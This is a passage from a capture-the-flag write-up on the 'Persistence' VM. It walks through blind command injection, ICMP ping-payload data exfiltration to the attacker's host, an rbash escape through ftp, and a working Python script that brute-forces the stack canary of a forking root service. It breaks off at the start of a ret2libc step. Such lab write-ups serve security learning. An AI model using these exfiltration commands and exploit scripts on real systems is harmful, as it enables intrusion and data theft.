&lt;p&gt;No. Luck.&lt;/p&gt;

&lt;p&gt;I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port &amp;lsquo;prober&amp;rsquo; so that I can try and determine which port is open outgoing. The idea was to watch my &lt;code&gt;tcpdump&lt;/code&gt; for any tcp traffic comming from this host:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
for port in xrange(1, 65535):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.1)
    sock.connect_ex((&amp;quot;192.168.56.102&amp;quot;, port))
    sock.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Using my blind command injection, I echoed this content to &lt;code&gt;/tmp/probe.py&lt;/code&gt; via the input field, and then in a subsequent request, ran it using &lt;code&gt;python /tmp/probe.py&lt;/code&gt;. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open&amp;hellip;&lt;/p&gt;

&lt;h2 id=&#34;data-exfiltration&#34;&gt;data exfiltration&lt;/h2&gt;

&lt;p&gt;With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the &lt;code&gt;debug.php&lt;/code&gt; file on disk and tried to echo a PHP web shell to the same directory. This also failed.&lt;/p&gt;

&lt;p&gt;So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.&lt;/p&gt;

&lt;p&gt;Eventually, I came across the &lt;code&gt;-p&lt;/code&gt; argument for ping after reading &lt;a href=&#34;http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html&#34;&gt;this&lt;/a&gt; blogpost. From &lt;code&gt;man 8 ping&lt;/code&gt; we read:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-p pattern
   You may specify up to 16 ``pad&#39;&#39; bytes to fill out the packet you send.
   This is useful for diagnosing data-dependent problems in a network.
   For example, ``-p ff&#39;&#39; will cause the sent packet to be filled with all ones.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So that changes things. I quickly confirmed that we have &lt;code&gt;xxd&lt;/code&gt; available using my previous enumeration method and we did. Great.&lt;/p&gt;

&lt;p&gt;I fired up tcpdump with the &lt;code&gt;-X&lt;/code&gt; flag to show me the packet contents, and tested it out with the following payload for the &lt;code&gt;id&lt;/code&gt; command:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On the &lt;code&gt;tcpdump&lt;/code&gt; side of things&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop# tcpdump icmp -X
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
09:18:14.439222 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 6920, seq 1, length 64
    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
    0x0010:  c0a8 3866 0800 4b5b 1b08 0001 56a3 1a54  ..8f..K[....V..T
    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0050:  3439 3828                                498(
09:18:14.439248 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 6920, seq 1, length 64
    0x0000:  4500 0054 a049 0000 4001 e840 c0a8 3866  E..T.I..@..@..8f
    0x0010:  c0a8 3868 0000 535b 1b08 0001 56a3 1a54  ..8h..S[....V..T
    0x0020:  f357 0a00 6e67 696e 7829 2067 7569 643d  .W..nginx).guid=
    0x0030:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0040:  3439 3828 6e67 696e 7829 2067 7569 643d  498(nginx).guid=
    0x0050:  3439 3828                                498(
09:18:14.440365 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 7176, seq 1, length 64
    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
    0x0010:  c0a8 3866 0800 318a 1c08 0001 56a3 1a54  ..8f..1.....V..T
    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0050:  3938 286e                                98(n
09:18:14.440382 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 7176, seq 1, length 64
    0x0000:  4500 0054 a04a 0000 4001 e83f c0a8 3866  E..T.J..@..?..8f
    0x0010:  c0a8 3868 0000 398a 1c08 0001 56a3 1a54  ..8h..9.....V..T
    0x0020:  e35a 0a00 6769 6e78 2920 6772 6964 3d34  .Z..ginx).grid=4
    0x0030:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0040:  3938 286e 6769 6e78 2920 6772 6964 3d34  98(nginx).grid=4
    0x0050:  3938 286e                                98(n
09:18:14.441191 IP 192.168.56.104 &amp;gt; 192.168.56.102: ICMP echo request, id 7432, seq 1, length 64
    0x0000:  4500 0054 0000 4000 4001 488a c0a8 3868  E..T..@.@.H...8h
    0x0010:  c0a8 3866 0800 ed92 1d08 0001 56a3 1a54  ..8f........V..T
    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0050:  3d34 3938                                =498
09:18:14.441198 IP 192.168.56.102 &amp;gt; 192.168.56.104: ICMP echo reply, id 7432, seq 1, length 64
    0x0000:  4500 0054 a04b 0000 4001 e83e c0a8 3866  E..T.K..@..&amp;gt;..8f
    0x0010:  c0a8 3868 0000 f592 1d08 0001 56a3 1a54  ..8h........V..T
    0x0020:  f95d 0a00 286e 6769 6e78 290a 6f75 7073  .]..(nginx).oups
    0x0030:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0040:  3d34 3938 286e 6769 6e78 290a 6f75 7073  =498(nginx).oups
    0x0050:  3d34 3938                                =498
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Mind. Blown.&lt;/p&gt;

&lt;p&gt;In case you don&amp;rsquo;t see it, we have extracts of the &lt;code&gt;id&lt;/code&gt; command in the request/response packets like &lt;em&gt;98(nginx).grid=4&lt;/em&gt;. While this is not really fun to decipher, and with commands that produce a lot of output even worse, it was in fact &lt;strong&gt;something&lt;/strong&gt; to work with!&lt;/p&gt;

&lt;p&gt;I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; sniff(filter=&amp;quot;icmp[icmptype] == 8 and host 192.168.56.104&amp;quot;, prn=lambda x: x.load)
ؤT�nginx) guid=498(nginx) guid=498(nginx) guid=498(
ؤT
   ginx) grid=498(nginx) grid=498(nginx) grid=498(n
ؤT�(nginx)
oups=498(nginx)
oups=498(nginx)
oups=498
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;sysadmin-tool&#34;&gt;sysadmin-tool&lt;/h2&gt;

&lt;p&gt;So with actual output to work with, I can almost say I have shell, however, it&amp;rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.&lt;/p&gt;

&lt;p&gt;At one stage I ran &lt;code&gt;ls&lt;/code&gt; as the command trying to see if there was anything in the web path that I may not have found yet. A file called &lt;em&gt;sysadmin-tool&lt;/em&gt; was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through &lt;code&gt;strings&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# strings sysadmin-tool
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
chroot
strncmp
puts
setreuid
mkdir
rmdir
chdir
system
__libc_start_main
GLIBC_2.0
PTRh
[^_]
Usage: sysadmin-tool --activate-service
--activate-service
breakout
/bin/sed -i &#39;s/^#//&#39; /etc/sysconfig/iptables
/sbin/iptables-restore &amp;lt; /etc/sysconfig/iptables
Service started...
Use avida:dollars to access.
/nginx/usr/share/nginx/html/breakout
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;;./sysadmin-tool --activate-service| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.104 --reason -sV -p-

Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 09:46 SAST
Nmap scan report for 192.168.56.104
Host is up, received reset (0.0017s latency).
Not shown: 65533 filtered ports
Reason: 65533 no-responses
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 5.3 (protocol 2.0)
80/tcp open  http    syn-ack nginx 1.4.7

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6637.05 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay! SSH.&lt;/p&gt;

&lt;h2 id=&#34;shell-and-breakout-as-avida&#34;&gt;shell and breakout as avida&lt;/h2&gt;

&lt;p&gt;Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
The authenticity of host &#39;192.168.56.104 (192.168.56.104)&#39; can&#39;t be established.
RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added &#39;192.168.56.104&#39; (RSA) to the list of known hosts.
avida@192.168.56.104&#39;s password:    # dollars
Last login: Thu Sep 18 05:57:30 2014
-rbash-4.1$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Op success. Or is it? I immediately noticed the prompt as &lt;code&gt;rbash&lt;/code&gt;, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a &lt;code&gt;/&lt;/code&gt; in them.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-rbash-4.1$ /bin/bash
-rbash: /bin/bash: restricted: cannot specify `/&#39; in command names
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the next logical step was to attempt &amp;lsquo;breaking out&amp;rsquo; of this shell so that I can have a better look around. I was able to cat say &lt;code&gt;/etc/passwd&lt;/code&gt;, but that only gets you &lt;em&gt;that&lt;/em&gt; far :P&lt;/p&gt;

&lt;p&gt;After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic &lt;code&gt;vi&lt;/code&gt; &lt;code&gt;:shell&lt;/code&gt; breakout. Eventually (and out of desperation), I focussed my attention to &lt;code&gt;ftp&lt;/code&gt;. Opening &lt;code&gt;ftp&lt;/code&gt;, and typing &lt;code&gt;help&lt;/code&gt; at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;-rbash-4.1$ ftp
ftp&amp;gt; !
+rbash-4.1$ /bin/bash
bash-4.1$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I got dropped into another &lt;code&gt;rbash&lt;/code&gt; shell, however this time with a +. So, I went for &lt;code&gt;/bin/bash&lt;/code&gt; and&amp;hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!&lt;/p&gt;

&lt;h2 id=&#34;the-wopr-game&#34;&gt;the wopr game&lt;/h2&gt;

&lt;p&gt;During the enumeration done while still stuck with &lt;code&gt;rbash&lt;/code&gt;, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of &lt;code&gt;netstat&lt;/code&gt;. Opening a telnet session to this port presented you with a &amp;lsquo;game&amp;rsquo;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ telnet 127.0.0.1 3333
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is &#39;^]&#39;.
[+] hello, my name is sploitable
[+] would you like to play a game?
&amp;gt; yes!
[+] yeah, I don&#39;t think so
[+] bye!
Connection closed by foreign host.
bash-4.1$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I asked really, really nicely, but no matter how polite I was, it would just not let me play!&lt;/p&gt;

&lt;p&gt;Further inspection showed that the game was possibly run as root from &lt;code&gt;/usr/local/bin/wopr&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ ps -ef | grep wopr
root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
root      1577  1005  0 06:43 ?        00:00:00 [wopr] &amp;lt;defunct&amp;gt;
avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr

bash-4.1$ ls -lah /usr/local/bin/wopr
-rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;wopr&lt;/code&gt; was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# first, hex encode the file
bash-4.1$ xxd -p -c 36 /usr/local/bin/wopr
7f454c460101010000000000000000000200030001000000c08604083400000080110000
0000000034002000090028001e001b000600000034000000348004083480040820010000
[... snip ...]
38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
bash-4.1$

# next, I copied the xxd output from the persistence terminal
# and pasted it into a file called wopr.xxd. Then reverted it
# and redirected the output to `wopr`
root@kali:~# cat wopr.xxd | xxd -r -p &amp;gt; wopr
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&amp;hellip;&lt;/p&gt;

&lt;h2 id=&#34;wopr-stack-smashing&#34;&gt;wopr, stack smashing&lt;/h2&gt;

&lt;p&gt;Poking around the binary, I mostly used &lt;code&gt;gdb&lt;/code&gt; along with &lt;a href=&#34;https://github.com/longld/peda&#34;&gt;peda&lt;/a&gt;.
Checksec revealed that this binary was compiled with quite a few security features built in.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./wopr
Reading symbols from persistence/wopr...(no debugging symbols found)...done.
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.&lt;/p&gt;

&lt;p&gt;With all of that in mind, I ran the binary with the &lt;code&gt;r&lt;/code&gt; command, and made a new telnet session to it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ r
[+] bind complete
[+] waiting for connections
[+] logging queries to $TMPLOG
[+] got a connection
[New process 26936]
[Inferior 2 (process 26936) exited normally]
Warning: not running or target is remote
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a &lt;code&gt;fork()&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ disass main
Dump of assembler code for function main:
    [.. snip ..]
   0x080489fd &amp;lt;+543&amp;gt;:   mov    DWORD PTR [esp],0x8048cb2
   0x08048a04 &amp;lt;+550&amp;gt;:   call   0x804866c &amp;lt;puts@plt&amp;gt;
   0x08048a09 &amp;lt;+555&amp;gt;:   call   0x804867c &amp;lt;fork@plt&amp;gt; # &amp;lt;--
   0x08048a0e &amp;lt;+560&amp;gt;:   test   eax,eax
   0x08048a10 &amp;lt;+562&amp;gt;:   jne    0x8048b0e &amp;lt;main+816&amp;gt;
   0x08048a16 &amp;lt;+568&amp;gt;:   mov    DWORD PTR [esp+0x8],0x21
   0x08048a1e &amp;lt;+576&amp;gt;:   mov    DWORD PTR [esp+0x4],0x8048cc8
   0x08048a26 &amp;lt;+584&amp;gt;:   mov    eax,DWORD PTR [ebp-0x22c]
   0x08048a2c &amp;lt;+590&amp;gt;:   mov    DWORD PTR [esp],eax
   0x08048a2f &amp;lt;+593&amp;gt;:   call   0x804858c &amp;lt;write@plt&amp;gt;
    [.. snip ..]
End of assembler dump.
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Why is the &lt;code&gt;fork()&lt;/code&gt; so important!? We will see in a bit just hang on. :)&lt;/p&gt;

&lt;p&gt;So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D&lt;/p&gt;

&lt;p&gt;Sending 30 x A&amp;rsquo;s results in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ [+] got a connection
*** stack smashing detected ***: wopr terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
wopr[0x80487dc]
wopr[0x8048ad6]
/lib/i386-linux-gnu/libc.so.6(__libc_start_main+0xe6)[0xb7e8ae36]
wopr[0x80486e1]
======= Memory map: ========
08048000-08049000 r-xp 00000000 08:01 1184792    wopr
08049000-0804a000 r--p 00000000 08:01 1184792    wopr
0804a000-0804b000 rw-p 00001000 08:01 1184792    wopr
0804b000-0806c000 rw-p 00000000 00:00 0          [heap]
b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
b7e73000-b7e74000 rw-p 00000000 00:00 0
b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
b7fc1000-b7fc4000 rw-p 00000000 00:00 0
b7fde000-b7fe1000 rw-p 00000000 00:00 0
b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
b7fff000-b8000000 rw-p 0001c000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
bffdf000-c0000000 rw-p 00000000 00:00 0          [stack]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So it looks like we may have a &lt;a href=&#34;http://en.wikipedia.org/wiki/Stack_buffer_overflow&#34;&gt;buffer overflow&lt;/a&gt; here. What is important though is the backtrace shows that the last fail was in &lt;code&gt;__fortify_fail&lt;/code&gt;. &lt;code&gt;__fortify_fail&lt;/code&gt; is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the &lt;code&gt;checksec&lt;/code&gt; output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.&lt;/p&gt;

&lt;p&gt;But lets not stop there. I continued to place more A&amp;rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&amp;rsquo;s, the backtrace had a full 4 bytes of 41.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[+] got a connection
*** stack smashing detected ***: wopr terminated
======= Backtrace: =========
/lib/i386-linux-gnu/libc.so.6(__fortify_fail+0x40)[0xb7f5ebb0]
/lib/i386-linux-gnu/libc.so.6(+0xeab6a)[0xb7f5eb6a]
wopr[0x80487dc]
[0x41414141]        #&amp;lt;-- EIP?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Was this where EIP was?
With the debugging we have done thus far, lets assume that the stack layout looks something like this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;         - &amp;gt;

[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]

- -&amp;gt;         - -&amp;gt;        [42 Bytes  in Total]        - -&amp;gt;         - &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;wopr-stack-canary-bruteforce&#34;&gt;wopr - stack canary bruteforce&lt;/h2&gt;

&lt;p&gt;This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.&lt;/p&gt;

&lt;p&gt;A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;http://phrack.org/issues/67/13.html&#34;&gt;Phrack Issue 67&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/&#34;&gt;The Art Of ELF: Analysis and Exploitations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/&#34;&gt;Fusion level04 write-up&lt;/a&gt; (SPOILER ALERTS for another CTF)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now, remember I mentioned &lt;code&gt;fork()&lt;/code&gt; earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of &lt;code&gt;fork()&lt;/code&gt; and how this affects stack cookies.&lt;/p&gt;

&lt;p&gt;From &lt;code&gt;man 2 fork&lt;/code&gt;&amp;rsquo;s description:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;DESCRIPTION
     Fork() causes creation of a new process.  The new process (child process)
     is an exact copy of the calling process (parent process) except for the
     following:

 [.. snip ..]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;What this means for us then is that every time we have a new &lt;code&gt;fork()&lt;/code&gt; happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. &lt;em&gt;”Soooooooo what?”&lt;/em&gt; I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!&lt;/p&gt;

&lt;p&gt;The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of &lt;code&gt;wopr&lt;/code&gt;, I can just watch the console output, however, I don&amp;rsquo;t have that luxury on the Persistence VM!&lt;/p&gt;

&lt;p&gt;While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) -&amp;gt; xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!&lt;/p&gt;

&lt;p&gt;When a string of less than 30 A&amp;rsquo;s is sent, the server will send a &amp;ldquo;[+] bye!&amp;rdquo; message before closing the socket. More than 30 A&amp;rsquo;s, and the socket is killed before the bye&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# telnet 127.0.0.1 3333
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is &#39;^]&#39;.
[+] hello, my name is sploitable
[+] would you like to play a game?
&amp;gt; A
[+] yeah, I don&#39;t think so
[+] bye!                           # &amp;lt;-- We have a bye!
Connection closed by foreign host.

root@kali:~# telnet 127.0.0.1 3333
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is &#39;^]&#39;.
[+] hello, my name is sploitable
[+] would you like to play a game?
&amp;gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[+] yeah, I don&#39;t think so
Connection closed by foreign host. # &amp;lt;-- No bye!
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word &lt;em&gt;bye&lt;/em&gt; in the last socket receive to know if we have succeeded or not. The resultant script was therefore:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import socket
import sys

payload = &amp;quot;A&amp;quot; * 30  # amount of bytes before the first canary bit is hit
canary = &amp;quot;&amp;quot;         # the canary

# start the canary brute loop. We want to brute 4 bytes ...
for x in xrange(1,5):

    # ... and try all possibilities
    for canary_byte in xrange(0, 256):

        # prepare the byte
        hex_byte = chr(canary_byte)

        # prepare the payload
        send = payload + canary + hex_byte

        print &amp;quot;[+] Trying: &#39;\\x{0}&#39; in payload &#39;%s&#39; (%d:%d/255)&amp;quot;.format(hex_byte.encode(&amp;quot;hex&amp;quot;)) % (send, x, canary_byte)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((&#39;127.0.0.1&#39;, 3333))

        # get the inital banners
        sock.recv(35)   # [+] hello, my name is sploitable\n
        sock.recv(40)   # [+] would you like to play a game?\n
        sock.recv(5)    # &amp;gt;

        # send the payload
        sock.send(send)
        sock.recv(27)   # [+] yeah, I don&#39;t think so\n

        # if we have a OK response, then we will have this last part
        # as &#39;[+] bye!\n&#39; populated, if its wrong, not
        data =  sock.recv(64)   # [+] bye!\n
        if &amp;quot;bye&amp;quot; in data:
            print &amp;quot;[!!] Found a possible canary value of &#39;{0}&#39;!&amp;quot;.format(hex_byte.encode(&amp;quot;hex&amp;quot;))
            canary += hex_byte
            sock.close()
            break

        sock.close()

    # if we cant even find the first byte, we failed already
    if len(canary) &amp;lt;= 0:
        print &amp;quot;[-] Unable to even find the first bit. No luck&amp;quot;
        sys.exit(0)

if len(canary) &amp;gt; 0:
    print &amp;quot;[+] Canary seems to be {0}&amp;quot;.format(canary.encode(&amp;quot;hex&amp;quot;))
else:
    print &amp;quot;[-] Unable to brute canary&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;An example run of this would end as follows:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;[+] Trying: &#39;\x8d&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:141/255)
[+] Trying: &#39;\x8e&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:142/255)
[+] Trying: &#39;\x8f&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:143/255)
[+] Trying: &#39;\x90&#39; in payload &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39; (4:144/255)
[!!] Found a possible canary value of &#39;90&#39;!
[+] Canary seems to be 00ef8d90
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A&amp;rsquo;s and send it. No stack smashing message appeared and we got the &lt;em&gt;bye&lt;/em&gt; message :)&lt;/p&gt;

&lt;h2 id=&#34;wopr-nx-and-eip&#34;&gt;wopr - NX and EIP&lt;/h2&gt;

&lt;p&gt;If you can recall from earlier, &lt;code&gt;wopr&lt;/code&gt; was compiled with the NX bit set. Effectively that means we can&amp;rsquo;t simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.&lt;/p&gt;

&lt;p&gt;The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the &lt;code&gt;system()&lt;/code&gt; command, for almost obvious reasons.&lt;/p&gt;

&lt;p&gt;I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bash-4.1$ ldd /usr/local/bin/wopr
    linux-gate.so.1 =&amp;gt;  (0xb7fff000)
    libc.so.6 =&amp;gt; /lib/libc.so.6 (0xb7e62000)
    /lib/ld-linux.so.2 (0x00110000)

